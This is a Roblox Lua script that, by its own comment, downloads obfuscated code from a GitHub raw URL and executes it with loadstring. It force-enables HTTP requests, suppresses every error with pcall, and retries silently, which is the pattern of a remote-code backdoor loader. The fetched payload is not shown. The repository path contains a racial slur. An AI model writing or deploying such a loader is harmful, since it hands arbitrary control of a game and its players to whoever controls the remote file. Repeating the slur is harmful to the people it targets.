-- Roblox Lua Script to load and execute obfuscated code from GitHub
local url = "https://raw.githubusercontent.com/jinglerniggler/sigmaniga2/refs/heads/main/baba"

-- Function to load and execute the script
local function loadAndExecuteScript()
    local success, result = pcall(function()
        local httpService = game:GetService("HttpService")
        local scriptContent = httpService:GetAsync(url)
        
        if scriptContent and #scriptContent > 0 then
            local loadSuccess, loadResult = pcall(function()
                local chunk = loadstring(scriptContent)
                if chunk then
                    chunk()
                end
            end)
        end
    end)
end

-- Main execution
local function main()
    local httpService = game:GetService("HttpService")
    if httpService then
        pcall(function()
            httpService.HttpEnabled = true
        end)
        loadAndExecuteScript()
    end
end

main()

-- Alternative loader with retry mechanism (no prints)
local function loadWithRetry(maxRetries)
    maxRetries = maxRetries or 3
    local attempts = 0
    
    while attempts < maxRetries do
        attempts = attempts + 1
        local success = pcall(function()
            loadAndExecuteScript()
        end)
        if success then
            return true
        end
        wait(2)
    end
    return false
end

loadWithRetry(3)
